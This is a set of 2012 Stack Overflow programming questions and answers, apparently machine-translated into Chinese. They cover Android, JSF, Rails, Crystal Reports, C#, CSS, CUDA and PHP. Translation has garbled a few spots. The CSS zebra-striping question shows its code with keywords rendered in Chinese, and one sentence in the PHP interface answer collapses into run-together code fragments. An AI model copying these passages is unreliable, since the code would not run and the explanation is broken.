## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:44:50.120

您是绝对正确的，这是设计使然。让我解释：

当您使用单个参数将值传递给`setTextSize()`方法时，它假定该值使用“sp”的单位，这类似于“dp”。两者都取值并应用适合设备分辨率的比例因子（mdpi 为 1.0，hdpi 为 1.5，xhdpi 为 2.0）。

来自 TextView 文档：

> 将默认文本大小设置为给定值，解释为“缩放像素”单位。此大小根据当前密度和用户字体大小偏好进行调整。

当您取回该值时，它始终以原始像素值存储。如果您还想以原始像素为单位设置文本大小，则应使用`setTextSize()`带有两个参数的版本，以便您可以指定单位常量。

Galaxy Nexus 是 xhdpi 设备（因此所有比例因子都是 2.0），Nexus 7 是 tvdpi 设备，比例因子为 1.333333。也许[本指南](http://developer.android.com/training/basics/supporting-devices/screens.html)将有助于解释更多。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-09T17:45:39.387

这两种方法使用不同的单位。返回的值`getTextSize()`是以实际测量的像素为单位，同时`setTextSize()`在 SP 中接受一个参数，然后为设备适当地测量它。你需要用`view.setTextSize(TypedValue.COMPLEX_UNIT_PX, a)`它来做你正在寻找的东西。该[文档](http://developer.android.com/reference/android/widget/TextView.html)有更多信息和其他单位值。

# php - 通过 PHP 和视频扩展在特定位置的视频中插入图像

> ID：13313139
> 
> 赞同：0
> 
> 时间：2012-11-09T17:38:11.213
> 
> 标签：php, video, video-editing

我想要做的是，通过使用 PHP 在服务器端的视频剪辑内放置一个小的静态图像。

例如，在电视新闻中，当主播描述犯罪事件时，您可能会在角落看到罪犯的照片。

我试过做一些研究。并找到了PHP 的[ffmpeg-php 扩展](http://ffmpeg-php.sourceforge.net/)。在浏览[文档](http://ffmpeg-php.sourceforge.net/doc/api/)时，如果我们像在 GD 中一样传递 x 和 y 位置，我找不到任何可以在特定位置插入图片的现成方法或类。

但是有一个[ffmpeg_frame](http://ffmpeg-php.sourceforge.net/doc/api/ffmpeg_frame.php)对象可用，我认为它可以用来一帧一帧地获取图像。我们将使用 GD 函数在其中插入所需的图像。在所有帧中插入图像后，我们将使用这些帧生成视频。这就是我的想法。但是该扩展程序的文档没有透露任何有关从帧创建视频的信息。只谈论创建动画 GIF ！

通过使用上述在每一帧中插入图像然后从中生成视频的方式（如果可能的话），这对 PHP 来说会是一个很大的负担吗？

或者有没有更好的方法来完成这个插入过程。我的意思是还有其他更好的扩展或视频库可用吗？

目的是在视频中插入图像，该图像将位于整个视频的特定位置。

提前致谢。

# facebook-like - 当我没有向我的网站添加“赞”按钮时，我的网站网址如何获得“赞”？

> ID：13313151
> 
> 赞同：1
> 
> 时间：2012-11-09T17:39:21.447
> 
> 标签：facebook-like

换句话说，其他人的哪些操作触发了我网站的 URL 以在没有“赞”按钮的情况下获得“赞”？没有按钮的人怎么能喜欢 Facebook 中的 url？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:09:44.957

正如我在评论中所说，我真的认为这个问题不属于 SOF。话虽如此，这是我的两分钱。

您可以“喜欢”任何网址。按钮就可以了。

这里甚至还有一个[chrome 扩展程序](https://chrome.google.com/webstore/detail/facebook-like-button/jehaijobeonhempacbjelicepjkhoidi)，可让您从浏览器中喜欢任何页面。

您甚至可以通过访问此 URL 来点赞一个页面：`http://www.facebook.com/plugins/like.php?href=[encoded url here]`

我认为真正的问题是你为什么关心你的网站是否被喜欢？为什么这有关系？

# colors - 如何在 Visual Studio 2012 中的选定文本上获得统一的颜色？

> ID：13313153
> 
> 赞同：2
> 
> 时间：2012-11-09T17:39:24.573
> 
> 标签：colors, visual-studio-2012, customization

我更改了仅允许您更改背景颜色的 Selected Text 颜色，但是当我选择一些文本时，我注意到颜色绝对不是统一的。对于关键字和标识符，所选文本的背景颜色看起来不同。

这是它的外观：

![在此处输入图像描述](../Images/4d8020c9166e4ccb6d2b6abe8b9f1fcc.png)

有没有办法来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T03:34:55.103

It seems that Visual Studio 2012 doesn't like non-default fonts. Probably a bug in VS2012\. Press the use Default fonts to solve the problem, so far that's the only solution I know.

# jsf-2 - 在 Facelets 模板客户端中注入额外的样式表（或脚本）

> ID：13313157
> 
> 赞同：9
> 
> 时间：2012-11-09T17:39:42.433
> 
> 标签：jsf-2

我的基于 JSF 的页面有以下主模板文件：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
          "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
   xmlns:ui="http://java.sun.com/jsf/facelets"
   xmlns:h="http://java.sun.com/jsf/html"
   xmlns:f="http://java.sun.com/jsf/core"
   xmlns:p="http://primefaces.org/ui">
<h:head>
   <title><ui:insert name="title">MyApp</ui:insert></title>
   <h:outputStylesheet name="stylesheet.css" library="styles"/>
</h:head>

<h:body>

   <div id="container">
      <div id="header">
         <ui:insert name="header">
            // header content
         </ui:insert>
      </div>

      <div id="content">
         <ui:insert name="content">
         </ui:insert>
      </div>

      <div id="footer">
         <ui:insert name="footer">
         </ui:insert>
      </div>
   </div>
</h:body>

</html> 
```

在头部部分，我们有`stylesheet.css`. 该样式表包含我所有页面通用的所有全局样式。

在模板客户端中，我想添加特定于页面的样式表。因此，我尝试在模板客户端页面中添加以下行：

```
<ui:composition template="/pages/templates/template.xhtml">
   <ui:define name="content">
      <h:outputStylesheet name="indexPage.css" library="styles" target="head"/>

      // body content

</ui:composition> 
```

然而，这似乎并没有添加`indexPage.css`到生成的 HTML 的 head 部分中。

我正在使用 Mojarra 2.1.2。它支持`target`属性吗？我没有看到它被列为我在 Eclipse 中的自动建议选项中的可用选项之一。

如果没有，我如何在仍然使用模板的同时注入*额外的页面特定 CSS？*

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-10-06T10:14:07.890

将新模板内容添加到您的主模板文件中，`head`专门用于**css**文件链接：

```
<h:head>
   <title><ui:insert name="title">MyApp</ui:insert></title>
   <h:outputStylesheet name="stylesheet.css" library="styles"/>
   <ui:insert name="css"/>
</h:head> 
```

在模板客户端页面中添加页面特定样式表，如下所示：

```
<ui:composition template="/pages/templates/template.xhtml">
   <ui:define name="css">
      <h:outputStylesheet name="indexPage.css" library="styles"/>
   </ui:define>
   ...
</ui:composition> 
```

而不是`h:outputStylesheet`可以使用`<link rel="stylesheet" type="text/css" href="relative path to css file">`。重要的是，主模板中`ui:insert`的**css**应该在`h:head`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-19T13:31:23.980

我刚遇到类似的问题，一位朋友帮助了我。解决方案是在 ui:composition 的子标题中导入 css

```
<ui:composition
    xmlns="http://www.w3.org/1999/xhtml"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:p="http://primefaces.org/ui"
    template="/template.xhtml"
>
    <ui:define name="subheader">
        <h:outputStylesheet library="css" name="my-style.css" />
    </ui:define>

    <ui:define name="content">
    </ui:define>
    </ui:composition> 
```

# ruby-on-rails - 为什么 Rails update_attributes 在保存之前调用验证

> ID：13313159
> 
> 赞同：0
> 
> 时间：2012-11-09T17:39:47.343
> 
> 标签：ruby-on-rails, validation

我在 Rails 中遇到了一个非常奇怪的问题。我正在使用`update_attributes`父对象来更新所有子对象。子对象具有（自定义）验证，并且确实可以正常工作，这意味着如果我提供错误的值，验证触发器就会返回错误。

现在我处于一种奇怪的情况，其中一个模型在数据库中无效（我们不要质疑为什么，假设我可以进入数据库并运行一些 SQL 以使模型无效）。如果我进入我的应用程序，我可以看到无效值，这很好。我修复了这些值并再次保存，我可以看到，在保存新值之前也调用了验证的 ruby​​ 代码，这意味着我会得到一个错误，Rails 永远不会执行 SQL 来实际将值更新到正确的。

我希望以上是有道理的。你有什么想法还是你认为我忽略了什么？

**解决方案：**

发生的事情是多对多关系在被新数据替换之前验证现有数据库数据。基本上结构是这样的：

```
class User
    has_many :user_permissions
    has_many :permissions, :through => :model_permissions

class Permission
    has_many :user_permissions
    has_many :users, :through => :user_permissions

class UserPermission
    belongs_to :user
    belongs_to :permission
    validates_associated :user       # THIS was causing the problem
    validates_associated :permission # and THIS as well 
```

我只是删除了该`validates_associated`指令，因为无论如何我都在独立验证链接的记录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:47:03.897

好吧，Rails 在将数据写入数据库之前会运行您的验证（请参阅[Active Record 回调序列](http://api.rubyonrails.org/classes/ActiveRecord/Callbacks.html)），因此出现验证错误意味着您尝试保存的模型的某些部分无效。它可能是一个关联模型，其中包含启用验证的错误，或者只是一些缺失的部分——无论如何，看看你得到的错误是什么。

万一（让我们毫无疑问：）您想跳过验证 - 您可以选择#update_attribute（仅更新一个属性），调用#save（false），使用模型类的+udpate_all方法，甚至去一直到 ActiveRecord::Base.connection.execute——这些都不会因为验证错误而困扰你 :)

# crystal-reports - 水晶报告错误：选择时“此处需要一个字符串”

> ID：13313162
> 
> 赞同：1
> 
> 时间：2012-11-09T17:40:11.977
> 
> 标签：crystal-reports

我在水晶报告中运行以下代码，它告诉我

> “这里需要字符串”

在第二种情况下。我尝试将 {?Pm-Student_course_attendance_csv.Level} 转换为字符串，但没有运气

```
 Global NumberVar grade;
 Global NumberVar baseline;

Select ({?Pm-Student_course_attendance_csv.Level})
  Case "R", "TL", "TU", "OTH", "P", "BTECFS": 
    If (CStr({PM_csv.mv_value}) = "Pass") Then
       "On Track"
    Else
       "Below"

  Case "H", "ASD", "AD", "AS", "G":     //error from this line onwards inclusive
     Select (CStr({PM_csv.mv_value}))
        Case "A*":
            grade := 11
        Case "A*/A":
            grade := 10
        Case "A":
            grade := 9
        Case "A/B":
            grade := 8
        Case "B":
            grade := 7
        Case "B/C":
            grade := 6
        Case "C":
            grade := 5
        Case "C/D":
            grade := 4
        Case "D":
            grade := 3
        Case "D/E":
            grade := 2
        Case "E":
            grade := 1
        Case "U":
            grade := 0
        Default :
            grade := 0; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:49:38.117

您的公式不能有两种不同的返回类型。从错误和上面它返回一个字符串，但在它下面你试图返回一个数字（公式的返回类型也是最后一个赋值，所以如果你的公式做的最后一件事是`grade:=1`那么公式试图返回值 1，这显然不允许您这样做。您必须在公式的后半部分为每个案例添加一个字符串返回值。

```
...
  Case "H", "ASD", "AD", "AS", "G":     //error from this line onwards inclusive
     Select (CStr({PM_csv.mv_value}))
        Case "A*":
            grade := 11;
            "Return value" //<---- Must be a string
        Case "A*/A":
... 
```

# javascript - 显示功能不适用于图像映射

> ID：13313163
> 
> 赞同：0
> 
> 时间：2012-11-09T17:40:16.250
> 
> 标签：javascript, jquery, show, imagemap, area

我有一个图像映射，想使用 show 函数淡入一些矩形 div。但它没有响应。

**Javascript**

```
<script type="text/javascript">
$(".levert").click(function () {
$("#popUpDiv").show("slow");
});

</script> 
```

**HTML**

```
<img id="logo" src="./logo2.png" alt="Phlox" usemap="#links"><p class="logotext">Phlox</p></img>

<map name="links">
<area shape="circle" coords="294,46,46" href="#" class="levert"></area>
</map>

</div>
<div id="popUpDiv" style="display:none">
</div> 
```

**CSS**

```
#popUpDiv {
      position:absolute;
      background-color:#3F6;
      width:400px;
      height:400px;
      border:5px solid #000;
      z-index: 9002;
      } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T17:42:48.073

将您的代码包装在文档就绪调用中：

```
<script type="text/javascript"> 
$(document).ready(function() {
    $(".levert").click(function() {
        $("#popUpDiv").show("slow");
    });
});
</script>​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T17:45:39.027

如果我在页面加载后执行此操作，则适用于 Mac 上的 Fx17 和 Chrome 22

```
$(function() { .... }); 
```

[演示](http://jsfiddle.net/mplungjan/ssNXV/)

# java - Internet Explorer 中的 PDF 导出打印

> ID：13313165
> 
> 赞同：6
> 
> 时间：2012-11-09T17:40:21.263
> 
> 标签：java, javascript, pdf, browser, jasper-reports

```
protected static byte[] exportReportToPdf(JasperPrint jasperPrint) 
                                                      throws JRException {
  JRPdfExporter exporter = new JRPdfExporter();       
  ByteArrayOutputStream baos = new ByteArrayOutputStream();

  exporter.setParameter(JRExporterParameter.JASPER_PRINT, jasperPrint);
  exporter.setParameter(JRExporterParameter.OUTPUT_STREAM, baos);
  exporter.setParameter(JRPdfExporterParameter.PDF_JAVASCRIPT, 
              "this.print({bUI: true,bSilent: false,bShrinkToFit: true});");

  exporter.exportReport();        
  return baos.toByteArray();
} 
```

我们正在使用这样的代码从 Jasper 应用程序中导出 PDF 文档。

线

```
exporter.setParameter(JRPdfExporterParameter.PDF_JAVASCRIPT, 
             "this.print({bUI: true,bSilent: false,bShrinkToFit: true});"); 
```

添加 JavaScript 以将 PDF 文档直接发送到打印机。

预期的行为是打印对话框将显示 PDF 文档的预览。

这在大多数情况下都可以正常工作 - 除了我在 Internet Explorer 8 和 Firefox 中每 5-6 次遇到问题。

发生的情况是 - 带有 PDF 文档的打印预览对话框没有出现，或者在预览窗口中出现空白文档。

-我尝试了许多不同的 JavaScript（不同的参数`this.print()`通过-`exporter.setParameter` 我尝试设置不同的响应标头，例如

```
response.setContentType("application/pdf");
response.setHeader("Content-disposition","inline;  filename=\"" 
                   + reportName 
                   + "\"");
response.setContentLength(baos.size()); 
```

这些似乎没有帮助

这似乎是一个 IE 和 FF 问题。有没有人处理过这个问题？我需要让它 100% 地在所有浏览器上工作。实现将 PDF 文档导出直接发送到打印机的目标可能是另一种方法？还是可以跨浏览器工作的第三方库？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-20T18:26:52.750

也许它没有机会更新 UI。下面的代码延迟了打印，也许给了它需要的机会。我没有测试，因为我没有你的环境。

```
exporter.setParameter(JRPdfExporterParameter.PDF_JAVASCRIPT,
    "app.setTimeOut('this.print({bUI: true,bSilent: false,bShrinkToFit: true});',200);") 
```

# c# - 选择列表框中的特定项目

> ID：13313167
> 
> 赞同：0
> 
> 时间：2012-11-09T17:40:25.317
> 
> 标签：c#, winforms

我的列表框中有 6 个项目。

我想要这样，如果我单击列表框中的前 2 个，我可以设置一个随机数。我不需要知道如何制作随机数。

我认为它会是这样的：

```
if (listBox1.SelectedIndex = 1)
{
    int no1 = random.Next(10, 50);
} 
```

就在“如果”之后，我看到以下错误：

> 无法将类型“int”隐式转换为“bool”

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T17:41:59.230

应该：`if (listBox1.SelectedIndex == 1)`

`=`运算符是赋值，是`==`相等。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-09T17:41:55.927

您需要使用两个等号来检查是否相等。

```
if (listBox1.SelectedIndex == 1)
{
  int no1 = random.Next(10, 50);
} 
```

[您可以在 MSDN 上阅读有关 C# 相等性的更多信息](http://msdn.microsoft.com/en-us/library/dd183752.aspx)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:28:27.287

是的，在 int 的情况下，您不能使用 = 运算符来检查相等性，您只需要使用 == 运算符进行检查，就可以在 bool 编译器的情况下不会给出任何错误，但它可以 resign.mean 说。

```
if (listBox1.SelectedIndex == 1)
 {
   int no1 = random.Next(10, 50);
 } 
```

在 Bool 的情况下是正确的

假设你必须写。

```
bool test=false;
if(test=true)
{
 //some code goes here 
 } 
```

它不会给你编译器错误它会重新分配测试。

# objective-c - 来自html的hpple解析表

> ID：13313172
> 
> 赞同：2
> 
> 时间：2012-11-09T17:40:46.147
> 
> 标签：objective-c, html-table, html-parsing, hpple

我对“Hpple”有疑问。我正在解析 html 文件，我想获取整个表格，但我得到的结果是 (null)。

我在 Objective-C 中的代码：

```
-(void)loadTutorials {

    // 1

    paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    filePath = [NSString stringWithFormat:@"%@/%@", [paths objectAtIndex:0],@"index.html"];

    NSData  *data = [NSData dataWithContentsOfFile:filePath];

    // 2
    TFHpple * doc   = [[TFHpple alloc] initWithHTMLData:data];

    // 3
    NSString *tutorialsXpathQueryString = @"/html/body/div/table/tr/td[@class='bottomwideborder']"; //Next comes the big table

    NSArray *tutorialsNodes = [doc searchWithXPathQuery:tutorialsXpathQueryString];

    for (TFHppleElement *element in tutorialsNodes) {

        table = [element text];

    }

}

- (void)viewDidLoad
{
    [super viewDidLoad];

    [self loadTutorials];

    html = [NSString stringWithFormat:@"<html><body>%@</body></html>", table];

    [Web loadHTMLString:html baseURL:nil];

} 
```

我也想解析的表很长，我认为它对于 NSString 或 NSArray 来说太大了

我能做些什么来解决这个问题？

# ms-access - MS Access：在列名中使用年份？

> ID：13313174
> 
> 赞同：1
> 
> 时间：2012-11-09T17:40:54.833
> 
> 标签：ms-access

当我尝试这样命名一列时：

`(year(now())+1) & " Revenue" : Revenue0`

它从字面上显示 (year(now())+1) & "Revenue" 而不是 "2013 Revenue"

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:07:44.570

AFAICT，您希望数据库引擎为查询字段表达式派生别名，类似于...

```
SELECT 1234.56 AS Year(Date()) & " Revenue"; 
```

不幸的是，这会引发错误：“ *SELECT 语句包含拼写错误或丢失的保留字或参数名称，或者标点符号不正确。* ”

db 引擎不能使用函数来派生别名；您只能为其提供别名的文字字符串值。

您可以从更改查询的 SQL 属性的函数运行已保存的查询。这将允许您用不同的字符串值替换别名。

如果您保存的查询被命名为“qryFoo”并且包含它作为它的 SQL ...

```
SELECT Revenue0 AS REVENUEYEAR
FROM YourTable; 
```

...你可以这样做...

```
Dim db As DAO.Database
Dim qdf As DAO.QueryDef
Set db = CurrentDb
Set qdf = db.QueryDefs("MyQuery")
qdf.SQL = Replace(qdf.SQL, "REVENUEYEAR", Cstr(Year(Date())+1) & " Revenue") 
```

然后打开修改后的查询。

# php - 如何实现扩展接口？

> ID：13313175
> 
> 赞同：3
> 
> 时间：2012-11-09T17:40:54.960
> 
> 标签：php, spl

我正在玩一些设计模式，并想使用 SPL 的观察者模式创建一个示例。因为让观察者和主题完全通用是没有意义的，所以我想扩展接口以使它们更具体地用于手头的应用程序。问题是，当我运行下面的代码时，我收到诸如“DataAccess::update() 必须与 SplObserver::update() 兼容”之类的错误。

我知道我可以通过切换方法签名以匹配接口的签名来使此代码无错误地执行。我的问题是：**为什么它不允许签名中定义的类的孩子？** 下面，ModelObserver 是一个 SplObserver，Model 是一个 SplSubject。我原以为这会奏效。我错过了什么吗？

仅供参考，我知道我可以使用接口中定义的显式方法签名，并在我的代码逻辑中使用 instanceof 关键字来实现相同的目的。我只是希望找到一个更优雅的解决方案。谢谢！

```
<?php
interface ModelObserver extends SplObserver {
}

class DataAccess implements ModelObserver {

    /*
     * (non-PHPdoc) @see SplObserver::update()
     */
    public function update(Model $subject) {
        // TODO Auto-generated method stub
    }
}

// Just a generic model for the example
class Model implements SplSubject {
    private $_properties = array ();
    private $_observers = array ();

    /*
     * generically handle properties you wouldn't want to do it quite like this
     * for a real world scenario
     */
    public function __get($name) {
        return $this->_properties [$name];
    }
    public function __set($name, $value) {
        $this->_properties [$name] = $value;
    }
    public function __call($method, $args) {
        if (strpos ( $method, 'get' ) === 0) {
            $name = lcfirst ( str_replace ( 'get', '', $method ) );
            return $this->_properties [$name];
        }

        if (strpos ( $method, 'set' ) === 0) {
            $name = lcfirst ( str_replace ( 'set', '', $method ) );
            $this->_properties [$name] = $args [0];
            return $this;
        }
    }
    public function __toString() {
        return print_r ( $this, true );
    }

    /*
     * (non-PHPdoc) @see SplSubject::attach()
     */
    public function attach(ModelObserver $observer) {
        $this->_observers [] = $observer;
        return $this;
    }

    /*
     * (non-PHPdoc) @see SplSubject::detach()
     */
    public function detach(ModelObserver $observer) {
        if (in_array ( $observer, $this->_observers )) {
            $f = function ($value) {
                if ($value != $observer) {
                    return $value;
                }
            };
            $observers = array_map ( $f, $this->_observers );
        }
        return $this;
    }

    /*
     * (non-PHPdoc) @see SplSubject::notify()
     */
    public function notify() {
        foreach ($this->_observers as $observer) {
            $observer->update($this);
        }
    }
}

$da = new DataAccess();

$model = new Model ();
$model->setName ( 'Joshua Kaiser' )->setAge ( 32 )->setOccupation ( 'Software Engineer' )
    ->attach($da);

echo $model; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:50:04.560

限制`DataAccess::update()`接受您的孩子`Model`违反了此界面的合同。

诚然，所有`Model`对象都属于 class `SplSubject`，但并非所有对象都`SplSubject`属于 class `Model`。接口是保证实现类支持接口支持的所有内容的契约。

您的代码（如果有效）会将`DataAccess::update()`方法限制为仅`Model`子类而不是更广泛的父类`SplSubjects`。您不能缩小传递给接口定义的方法的参数的范围。

假设您向`public $foo`Model 类添加了一个属性。如果允许，您可以在您的`DataAccess::update()`方法中使用该属性`$foo`。有人可能会出现并扩展到一个没有财产`SplSubjects`的孩子。他们不能再将. _`OddModel``$foo``OddModel``DataAccess::update()``$foo``OddModel`

这是接口背后的全部理念，通过实现它们，您同意 100% 支持接口定义的内容。在这种情况下，您的界面显示：

> 如果你实现我，你必须接受每一个`SplSubject`或类扩展`SplSubject`

您正在执行接口尝试违反合同。

# visual-studio-2012 - 有没有办法使用 Windows 7 开发机器创建 WinRT 应用程序？

> ID：13313179
> 
> 赞同：3
> 
> 时间：2012-11-09T17:41:01.000
> 
> 标签：visual-studio-2012, windows-8, windows-runtime, microsoft-metro, winrt-xaml

> **可能重复：**
> [我可以在 Windows 7 机器上为 Microsoft Surface 开发软件吗](https://stackoverflow.com/questions/13257478/can-i-develop-software-for-microsoft-surface-on-windows-7-machine)

有什么方法可以使用 Windows 7 开发机器创建 WinRT 应用程序，还是我必须安装 Windows 8 操作系统才能为 WinRT 平台开发？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-09T17:44:06.990

不。

WinRT 是仅在 Windows 8 中可用的新平台（截至目前）。因为它是紧密内置在内核中的，所以它不能作为单独的包/安装程序安装在其他操作系统（如 Win 7）之上。

Win8 操作系统是开发 WinRT 应用程序所必需的。

# android - 我需要通过按下 TextView (Eclipse) 来调用第二个 Activity

> ID：13313185
> 
> 赞同：0
> 
> 时间：2012-11-09T17:41:28.157
> 
> 标签：android, eclipse

我需要通过单击开始一项新活动`TextView`。我的代码：

```
txtFirst = (TextView) findViewById(R.id.textView3);
txtFirst.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {
        if (indTxt == 3) {
            Intent intent = new Intent (this, ActSecond.class);
            startActivity(intent);
        }
    }
}); 
```

我按了`Ctrl`++ ，但 Eclipse 显示以下错误`Shift`：`O`

![截屏](../Images/b46089c35b82998d9aa3659c891a42eb.png)

在这条线上：

```
Intent intent = new Intent (this, ActSecond.class);
startActivity(intent); 
```

后：

```
super.onCreate(savedInstanceState);
setContentView(R.layout.main); 
```

那么一切都好...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:46:45.470

这里`this`不是指您的课程，而是指 OnClickListener，请尝试：

```
Intent intent = new Intent(ActFirst.this, ActSecond.class); 
```

（假设这`ActFirst`是你班级的名字。）

* * *

另外我不知道你是否已经这样做了，但是：你需要`clickable`在 OnClickListener 工作之前设置一个 TextView 。

在 XML 中使用：

```
android:clickable="true" 
```

或Java：

```
txtFirst.setClickable(true); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T17:47:57.497

将当前活动或应用程序上下文而不是任何视图上下文作为第一个参数传递给意图构造函数（当前通过使用`this`您正在尝试将视图上下文传递给意图构造函数）：

```
Intent intent = new Intent (Current_Activity.this, ActSecond.class);
startActivity(intent); 
```

代替

```
Intent intent = new Intent (this, ActSecond.class);
startActivity(intent); 
```

# iphone - 从具有给定索引的字符串中获取子字符串

> ID：13313187
> 
> 赞同：-1
> 
> 时间：2012-11-09T17:41:36.940
> 
> 标签：iphone, objective-c, cocoa-touch

我正在尝试从字符串中获取 SubString

这是我正在调用的方法

```
-(NSString *)subStringBetweenStrings:(NSString*)str open:(NSString*)open close:(NSString *)close
{
    if ( str == nil || open == nil || close == nil )
        return nil;

    int start = [str rangeOfString:open].location;
    if (start != -1)
    {
        int end = [str rangeOfString:close].location;
        if ( end != -1)
        {
            return [str substringFromIndex:start]; // DONT WANT
        }
    }
    return nil;       
} 
```

我有`start point`，我有`End point`。如何从开始和结束索引中获取子字符串，例如 return`[ str subStringWithRange:(start, end)];`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:46:51.793

挑剔...

*   替换`int start`为`NSUInteger`，`NSRange` `location`就是这样定义的，
*   不要比较`start`，`-1`而是要`NSNotFound`

... 回答 ...

`return [str substringWithRange:NSMakeRange( start, end - start + 1 )]`

# css - 如何切换表格/网格中行的颜色？

> ID：13313195
> 
> 赞同：1
> 
> 时间：2012-11-09T17:42:05.680
> 
> 标签：css

有没有办法在 CSS 或 CSS3 中切换表格/网格中行的颜色？

```
<table>
    <thead>
        <tr>
            <td>Name</td>
            <td>Votes</td>
        </tr>
    </thead>
    <tbody class="rows">
        <tr>
            <td>Barack Obama</td>
            <td>50%</td>
        </tr>
        <tr>
            <td>Mitt Romney</td>
            <td>48%</td>
        </tr>
    </tbody>
</table> 
```

例如，奇数行是白色，偶数行是蓝色。

```
.rows tr：奇数
{
    背景颜色：白色
}
.rows tr：偶数
{
    背景颜色：蓝色
}

```

或者那不可能？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:53:04.350

:nth-of-type 和 :nth-child 伪元素都可以工作。

我喜欢第 n 个类型的方法：

```
/* Zebra striping */

  tr:nth-of-type(odd) { 
    background: blue; 
    }

    tr:nth-of-type(even) { 
    background: white; 
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T17:49:20.957

```
.rows tr:nth-child(even) {background-color: White}
.rows tr:nth-child(odd) {background-color: blue} 
```

见[**jsFiddle**](http://jsfiddle.net/zrmrP/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-09T17:45:58.213

您可以使用[nth-child](https://developer.mozilla.org/en-US/docs/CSS/%3anth-child)选择器来实现此目的：

```
.rows tr:nth-child(even) {background-color: #fff}
.rows tr:nth-child(odd) {background-color: blue} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T17:48:06.200

这样做： -

```
.rows tr:nth-child(even) {
    background-color: blue;
}
.rows tr:nth-child(odd) {
    background-color: yellow;
} 
```

为了让你理解，我已经改变了颜色。

参考**[现场演示](http://jsfiddle.net/SivaCharan/3DE7R/)**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T17:48:29.337

使用[`nth-child`](http://www.w3.org/TR/selectors/#nth-child-pseudo)伪类：

```
.rows tr:nth-child(odd)
{
    background-color: white;
}
.rows tr:nth-child(even)
{
    background-color: blue;
}​ 
```

[演示](http://jsfiddle.net/jBEcu/)

# cuda - 如何计算 gpu_array 的方差？

> ID：13313201
> 
> 赞同：2
> 
> 时间：2012-11-09T17:42:53.940
> 
> 标签：cuda, pycuda

我正在尝试计算 2D gpu_array 的方差。缩减内核听起来是个好主意：

[http://documen.tician.de/pycuda/array.html](http://documen.tician.de/pycuda/array.html)

但是，该文档暗示缩减内核只是将 2 个数组缩减为 1 个数组。如何将单个二维数组缩减为单个值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-10T01:30:58.043

我想第一步是为这种情况定义方差。在 matlab 中，二维数组上的方差函数返回值的向量（一维数组）。但听起来你想要一个单值方差，所以正如其他人已经建议的那样，可能要做的第一件事是将二维数组视为一维。在 C 中，我们不需要任何特殊步骤来完成此操作。如果你有一个指向数组的指针，你可以像一维数组一样索引它。我假设您不需要有关[如何处理具有 1D 索引的 2D 数组的](https://stackoverflow.com/questions/2151084/map-a-2d-array-onto-a-1d-array-c)帮助。

现在，如果它是你所追求的一维方差，我假设一个函数，如 variance(x)=sum((x[i]-mean(x))^2) 其中总和超过所有 i，就是你'之后（基于我对[维基百科文章](http://en.wikipedia.org/wiki/Variance)的阅读）。我们可以将其分解为 3 个步骤：

1.  计算平均值（这是一种经典的归约方式——为数据集生成一个值——将所有元素相加，然后除以元素的数量）
2.  计算所有 i 的值 (x[i]-mean)^2 - 这是逐个元素的操作，生成大小（元素数）与输入数据集相等的输出数据集
3.  计算步骤 2 中生成的元素的总和 - 这是另一种经典的归约，因为为整个数据集生成了一个值。

第 1 步和第 3 步都是经典的归约，它们对数组的所有元素求和。我不会在这里介绍这一点，而是向您指出[Mark Harris 对该主题的出色处理](http://gpgpu.org/static/sc2007/SC07_CUDA_5_Optimization_Harris.pdf)以及一些[CUDA 示例代码](http://docs.nvidia.com/cuda/cuda-samples/index.html#cuda-parallel-reduction)。对于第 2 步，我敢打赌你可以自己找出内核代码，但它看起来像这样：

```
#include <math.h>
    __global__ void var(float *input, float *output, unsigned N, float mean){

      unsigned idx=threadIdx.x+(blockDim.x*blockIdx.x);
      if (idx < N) output[idx] = __powf(input[idx]-mean, 2);
    } 
```

请注意，您可能希望将缩减和上述代码组合到一个内核中。

# qt - C++ Qt - Ui::Window 和继承/前向声明

> ID：13313206
> 
> 赞同：0
> 
> 时间：2012-11-09T17:43:06.590
> 
> 标签：qt

我正在实施纸牌游戏。我希望窗口`ui`成为 class 的对象`Rule`，以便`Rule`可以直接修改 GUI。

在构造函数中初始化`Rule`的对象也是如此。`Window * ui`

但是在编译过程中，编译器告诉我`rule.h`，“窗口尚未声明”，“窗口不是类型”。我包括在内`<window.h>`，所有内容都具有相同的类型，所有内容都已初始化，所以我想不出它为什么不起作用。

